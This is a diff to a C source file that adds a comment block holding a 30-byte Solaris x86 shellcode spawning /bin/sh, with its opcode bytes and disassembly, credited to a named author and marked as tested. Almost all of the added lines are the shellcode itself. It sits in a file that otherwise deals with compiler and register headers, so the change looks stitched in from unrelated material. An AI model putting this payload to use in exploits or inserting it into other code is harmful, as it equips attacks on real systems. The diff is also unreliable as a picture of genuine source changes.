@@ -16,6 +16,35 @@
 #include "compiler/compiler.h"
 #include "regs/state.h"
 
+/*
+ * SunOS (Solaris) / x86 execve("/bin/sh", {"/bin/sh", NULL}, NULL) 30 bytes
+ * shellcode
+ *
+ * Paulus Gandung Prakosa <gandung@lists.infradead.org>
+ *
+ * Tested on: SunOS solaris-vagrant 5.11 11.4.0.15.0 i86pc i386 i86pc
+ *
+ * Disassembly of section .text:
+ *
+ * 08050428 <_start>:
+ * 8050428:       33 f6                   xor    %esi,%esi
+ * 805042a:       56                      push   %esi
+ * 805042b:       68 6e 2f 73 68          push   $0x68732f6e
+ * 8050430:       68 2f 2f 62 69          push   $0x69622f2f
+ * 8050435:       8b dc                   mov    %esp,%ebx
+ * 8050437:       56                      push   %esi
+ * 8050438:       53                      push   %ebx
+ * 8050439:       8b cc                   mov    %esp,%ecx
+ * 805043b:       56                      push   %esi
+ * 805043c:       56                      push   %esi
+ * 805043d:       51                      push   %ecx
+ * 805043e:       53                      push   %ebx
+ * 805043f:       33 c0                   xor    %eax,%eax
+ * 8050441:       b0 3b                   mov    $0x3b,%al
+ * 8050443:       50                      push   %eax
+ * 8050444:       cd 91                   int    $0x91
+ */
+
 #ifndef unused
 #define unused(x) ((void)(x))
 #endif
